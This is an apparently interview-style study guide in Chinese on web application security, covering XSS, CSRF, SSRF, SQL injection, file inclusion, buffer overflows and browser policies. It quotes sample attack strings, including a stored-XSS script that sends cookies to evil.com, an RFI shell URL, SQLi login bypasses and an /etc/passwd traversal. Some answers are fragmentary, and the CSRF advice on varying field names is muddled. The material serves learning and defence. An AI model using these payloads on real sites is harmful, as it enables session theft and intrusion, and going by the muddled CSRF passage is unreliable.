# 應用程式／網頁應用程式安全

### 描述你最近寫過的程式或指令碼。它解決了什麼問題？

### 在效能為考量重點的高流量網站上，你會如何實作安全的登入欄位？

這裡想聽到的答案是：現階段整個網站都必須使用 TLS，而且幾乎沒有任何情況是你不該堅持要加密的。

### 有哪些方式可以應對帳號暴力破解（brute forcing）？

帳號鎖定、IP 限制、fail2ban、其商業版本等等。

### 什麼是 XSS、stored XSS、reflected XSS 以及 DOM-based XSS？

**XSS：** 將惡意程式碼注入有弱點的網頁應用程式。XSS 與其他網頁攻擊向量（例如 SQL injection）不同，它並非直接針對應用程式本身，而是讓網頁應用程式的使用者陷入風險。

**Stored XSS：** 又稱為持續型（persistent）XSS，是兩者中危害較大的一種。它發生於惡意指令碼被直接注入有弱點的網頁應用程式時。Stored 跨站指令碼（Cross-site scripting）弱點發生於酬載（payload）被儲存起來時，例如儲存在資料庫中，接著在使用者開啟該頁面時被執行。Stored 跨站指令碼之所以非常危險有幾個原因：

**Reflected XSS：** Reflected XSS 牽涉到將惡意指令碼從網頁應用程式反射（reflect）到使用者的瀏覽器上。該指令碼會被嵌入一個連結中，且只有在該連結被點擊後才會啟動。Reflected XSS 弱點發生於來自 URL 或 POST 資料的使用者輸入未經儲存就被反射到頁面上時。這表示攻擊者必須傳送一個經過精心設計的連結或 post 表單給受害者以插入酬載，而受害者必須點擊該連結。就歷史上而言，這類酬載有時會被內建的瀏覽器 XSS 過濾器攔截（例如 Chrome 的 XSS Auditor、IE 的 XSS Filter），但這些過濾器後來已被移除／棄用（Chrome 在 2019 年移除了 XSS Auditor），因此不應依賴它們來提供防護。

**DOM-based XSS：** 一種進階的 XSS 攻擊類型，當網頁應用程式的用戶端指令碼將使用者提供的資料寫入文件物件模型（Document Object Model，DOM）時便可能發生。該資料隨後被網頁應用程式從 DOM 讀取並輸出到瀏覽器。如果資料處理不當，攻擊者便可注入一段酬載，該酬載會被儲存為 DOM 的一部分，並在資料從 DOM 被讀回時執行。



`<img src=””>` 通常會從其他網站載入內容，發出一個跨來源（cross-origin）的 HTTP 請求。

### 你會如何獵尋（hunt）XSS？

盤點每一個使用者輸入可能進入、之後又被呈現出來的位置（URL 參數、表單欄位、標頭、cookie、路徑，以及回顯給使用者的已儲存資料）。注入一個唯一的標記，接著注入符合各情境的酬載（`"><svg onload=alert(1)>`、`';alert(1)//`、事件處理常式），觀察它是否被未經編碼地反射或儲存並執行。分別測試每一種輸出情境——HTML body、HTML 屬性、JavaScript、URL 與 CSS 各自需要不同的跳脫（breakout）方式。對於 DOM XSS，追蹤用戶端來源（`location`、`document.referrer`）到危險的接收點（sink，如 `innerHTML`、`document.write`、`eval`）。代理工具（Burp／ZAP）及其掃描器能加快這個過程，但人工的情境分析能抓到掃描器遺漏的部分。

#### 追問：給我一個 XSS 的範例，以及你能用它做什麼。

範例：某個留言欄位儲存了 `<script>fetch('https://evil.com/?c='+document.cookie)</script>`，接著它會在每一位檢視該留言的人的瀏覽器中執行（stored XSS）。有了 XSS，你可以竊取工作階段（session）cookie／權杖、以受害者身分執行動作、記錄鍵盤輸入、改寫頁面進行釣魚（phishing）、用像 BeEF 這樣的框架掛勾（hook）瀏覽器，或串接到瀏覽器漏洞利用。`HttpOnly` cookie 能削弱 cookie 竊取，但無法阻止以使用者身分行動的能力。

### XSS 的防範

輸入驗證（Input Validation）與輸出淨化（Output Sanitization），並以後者為重點。

XSS 可透過使用適當且可用的淨化器（sanitizer）來防範。網頁開發者必須留意他們接收資訊的閘道，而這些閘道正是必須被打造成阻擋惡意檔案的屏障之處。

有一些軟體或應用程式可以做這件事，例如 Firefox 的 XSS Me 以及 Google Chrome 的 DOM snitch。此外還有預設的網頁應用程式防火牆（web application firewall）公式，廣為人知的

此外，一套強健的 CSP 能為 XSS 提供額外一層防護。

### 什麼是 CSP（Content Security Policy，內容安全政策）？

一個 HTTP 回應標頭（`Content-Security-Policy`），它告訴瀏覽器可以從哪些來源載入或執行內容——指令碼、樣式、圖片、框架等等。透過將受信任的來源列入白名單，並禁止內嵌（inline）指令碼與 `eval`，它為 XSS 及資料注入增添了縱深防禦（defense-in-depth）。範例：`default-src 'self'; script-src 'self' https://cdn.example.com`。內嵌指令碼可以透過每次回應的 nonce 或雜湊（hash）安全地被允許。CSP 是一層緩解措施，並非輸出編碼的替代品。

### 跨站請求偽造 CSRF

#### 什麼是 CSRF？

跨站請求偽造（Cross-Site Request Forgery）誘騙一位已通過驗證的使用者的瀏覽器，向一個他們已登入的網站送出一個非本意、且會改變狀態的請求，濫用瀏覽器自動夾帶 cookie 的行為。範例：惡意頁面上一個隱藏、會自動送出的表單，利用受害者仍有效的工作階段對其銀行發動一筆資金轉帳；伺服器無法將它與一個真正的請求區分開來。防禦方式：anti-CSRF 權杖、`SameSite` cookie、驗證 Origin／Referer，以及對敏感動作要求重新驗證。

#### 該如何防禦 CSRF？

由伺服器對每個頁面或每個請求要求一個 nonce，是一種被接受但並非萬無一失的方法。

面對 CSRF 攻擊時，你可以選擇兩種可用的方法。

首先，在每個請求中嘗試夾帶一個隨機權杖。如此一來會產生一組獨特的權杖字串，這是一項不錯的防護措施。

其次，對表單的每個欄位嘗試使用不同的名稱。由於輸入了如此多不同的名稱，這在某種程度上能幫助你變得匿名，因而能作為防範 CSRF 攻擊的一道防護。

此外，可考慮使用 Same-Site Cookie 來防範 CSRF 攻擊。

### 什麼是 SSRF（Server Side Request Forgery，伺服器端請求偽造）？

伺服器端請求偽造使伺服器本身發出攻擊者指定的請求。透過控制一個伺服器會去抓取的 URL，攻擊者能觸及他們無法直接抵達的目的地——僅供內部使用的服務、管理面板，或雲端中繼資料端點（`http://169.254.169.254/`）以竊取執行個體（instance）憑證——並能對內部網路進行連接埠掃描。防禦方式：將對外目的地列入白名單、封鎖私有／連結本地（link-local）位址範圍與中繼資料 IP、限制 URL scheme，並且絕不將原始的、使用者提供的 URL 傳給伺服器端的抓取程式。

### 什麼是 SQL Injection？給我一個範例。

SQL injection 發生於不受信任的輸入被串接進一個 SQL 查詢中，讓攻擊者得以改變查詢的邏輯。範例：一個登入查詢 `SELECT * FROM users WHERE user='$u' AND pass='$p'`，當 `u = admin'--` 時會變成 `...WHERE user='admin'--' AND pass='...'`，將密碼檢查註解掉，並以 admin 身分登入。其影響範圍從讀取／修改／刪除資料、傾印（dump）整個資料庫，到在某些設定下於主機上執行指令。

#### 追問：
1. **SQL Injection prevention：** 參數化查詢（parameterized queries）／預備語句（prepared statements）（主要的修正方式）、會參數化的 ORM、輸入驗證、最小權限的資料庫帳號，以及作為後盾的 WAF。
2. **What is blind SQL Injection？** 這種 SQLi 中應用程式不回傳任何資料或錯誤訊息，因此攻擊者只能間接推斷結果——*boolean-based*（一個真／假條件會改變回應）或 *time-based*（例如 `' OR SLEEP(5)--` 會在條件為真時延遲回應）。

### HTTP 相關

#### HTTP 與 HTML 有什麼差別？

一個是網路／應用層協定，另一個是標記語言。

#### HTTP 如何處理狀態（state）？

它不處理。至少原生不處理。不錯的答案是像「cookie」這類的東西，但最好的答案是：cookie 是為了彌補 HTTP 本身不做這件事而生的一種取巧手段（hack）。

#### HTTP Public Key Pinning

（HPKP）

已被 Google Chrome 棄用。

#### Cookie

httponly——無法被 javascript 存取。

#### SQLi

瀏覽器中間人（(Wo)man in the browser）（flash／java applet）（惡意程式）。

網頁表單的驗證／淨化。

#### POST

表單資料。

#### GET

查詢。

從 URL 即可看見。

### 什麼是 Exfiltration？資料外洩（Data Exfiltration）

滲透（Infiltration）是指你進入某個地點、或將元素偷偷帶進某個地點的方法。外洩（Exfiltration）則恰恰相反：在不被發現的情況下將敏感資訊或物品帶出某個地點。在高度安全的環境中，這可能極為困難，但並非不可能。我們再次求助於那些穿著假冒送貨制服在建築物裡遊走的朋友，便會發現，沒錯，確實有辦法在不惹上太多麻煩的情況下進出。

資料外洩（Data exfiltration）或資料擠出（Data extrusion）是指從一台電腦未經授權地轉移資料。資料的轉移可以是由具有電腦實體存取權的人手動進行，也可以是自動化的，透過惡意程式在網路上執行。由於資料在連網的企業中經常進出，資料外洩可能與正常的網路流量非常相似，使得 IT 安全團隊難以偵測外洩的企圖。

### 什麼是 SOP（Same-origin policy，同源政策）？

一種瀏覽器安全機制，限制從某一來源（origin）載入的文件或指令碼可以如何與另一來源的資源互動。它並不會阻止跨來源請求被送出（這正是 CSRF 存在的原因）；它阻止的是某個指令碼讀取另一來源的回應、或存取其 DOM／cookie。所謂來源，是 scheme、主機（host）與連接埠（port）的組合。

### 什麼是 CORS（Cross-origin resource sharing，跨來源資源共享）？

跨來源資源共享。可以在 HTTP 標頭中指定允許的來源。它會送出一個帶有選項設定的預檢（preflight）請求，詢問伺服器是否核准，若伺服器核准，接著才會送出實際的請求（例如用戶端是否應該送出驗證用的 cookie）。

### 什麼是 SRI（Sub-Resource Integrity，子資源完整性）？

子資源完整性讓頁面能透過一個帶有密碼學雜湊（hash）的 `integrity` 屬性，來釘選（pin）外部指令碼或樣式表所預期的內容。瀏覽器抓取該資源（例如從 CDN）後，只有在雜湊相符時才會執行它，因此被竄改或遭入侵的第三方檔案會被拒絕。範例：`<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>`。

### 緩衝區溢位（Buffer Overflow）

#### 緩衝區溢位是如何運作的？

程式往一個固定大小的緩衝區寫入超過其容量的資料，覆寫了相鄰的記憶體。在堆疊（stack）上，讓一個區域緩衝區溢位可以覆寫已儲存的返回位址（return address）；當函式返回時，執行流程便跳往攻擊者選定的位置——被注入的 shellcode，或（在堆疊不可執行時）由既有程式碼構築而成的 ROP chain。其根本原因是缺少邊界檢查（bounds check），通常是透過像 `strcpy`、`gets` 或 `sprintf` 這類不安全的函式造成的。

#### 該如何防禦緩衝區溢位？

- 安全的程式撰寫：對所有複製動作進行邊界檢查、使用有長度限制的函式（`strncpy`、`snprintf`），並優先選用記憶體安全的語言（Rust、Go、Java）。
- 編譯器／作業系統緩解措施：stack canary、DEP／NX（堆疊不可執行）、ASLR、`FORTIFY_SOURCE`，以及控制流程完整性（control-flow integrity）。
- 流程：程式碼審查、靜態分析，以及在發行前透過模糊測試（fuzzing）找出溢位問題。

### 目錄穿越（Directory traversal）

找出伺服器上你本不應該看得到的目錄。

有工具可以做這件事。

如何防範？

### API

思考它們會回傳什麼資訊。

以及可以送出什麼。

### Beefhook

取得關於 Chrome 擴充功能的資訊。

### User agent

這是一個合法的瀏覽器嗎？還是一個殭屍網路（botnet）？

### 瀏覽器擴充功能遭接管（take-over）

挖礦程式、憑證竊取程式、廣告軟體（adware）。

### 本地檔案引入（Local file inclusion）

一種弱點，其中使用者輸入被用來從本地伺服器引入一個檔案（例如 `?page=../../../../etc/passwd`），讓攻擊者能讀取敏感檔案，或結合日誌污染（log poisoning）或已上傳的檔案等手法達成程式碼執行。防範方式是對輸入採用白名單，並且絕不將使用者輸入傳入 include／`require` 路徑。

### 遠端檔案引入（Remote file inclusion，如今較不常見）

與 LFI 類似，但應用程式引入的是攻擊者提供的一個遠端 URL 上的檔案（例如 `?page=http://evil.com/shell.txt`），直接在伺服器上執行攻擊者的程式碼。如今很罕見，因為大多數執行環境（runtime）預設會停用遠端引入（例如 PHP `allow_url_include=Off`）。

### 網頁弱點掃描器。

自動化工具，會爬取一個應用程式並探測常見的弱點（XSS、SQLi、設定錯誤、過時的元件）——例如 Burp Suite、OWASP ZAP、Nikto、Acunetix。它們擅長廣度與唾手可得的成果，但會遺漏邏輯漏洞並產生誤報（false positive），因此仍需要人工測試。

### SQLmap。

一個開源工具，將偵測與利用 SQL injection 的過程自動化——列舉資料庫、傾印資料表，並在某些情況下取得作業系統 shell。被廣泛用於確認並展示測試期間所發現的 SQLi 的影響。

### 惡意重新導向（Malicious redirects）。

開放式重新導向（Open-redirect）與強制重新導向（forced-redirect）弱點，其中應用程式將使用者送往一個由攻擊者控制的 URL（例如 `?next=http://evil.com`），用於釣魚、憑證竊取或惡意程式散布，同時看起來像是來自一個受信任的網站。防範方式是將重新導向的目標列入白名單，並避免讓使用者控制重新導向的目的地。
